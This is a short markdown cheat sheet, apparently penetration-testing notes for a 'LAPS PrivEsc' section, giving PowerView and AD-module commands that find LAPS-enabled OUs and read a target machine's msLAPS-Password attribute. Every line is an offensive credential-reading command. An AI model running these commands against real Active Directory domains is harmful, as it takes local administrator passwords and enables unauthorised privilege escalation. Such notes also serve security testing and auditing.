# Used heavily in the LAPS PrivEsc section
## Find OUs using LAPS
##### PowerView
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -like 'msLAPS-Password' }
```
##### AD Module
```
Find-LapsADExtendedRights
Get-LapsADPassword
#If LAPS tools are available
```

## Read LAPS Password
##### PowerView
```
Get-DomainObject -Identity targetmachine$ | select -ExpandProperty msLAPS-Password
```
##### AD Module
```
Get-ADComputer -Identity targetmachine -Properties msLAPS-Password | select -ExpandProperty msLAPS-Password
```
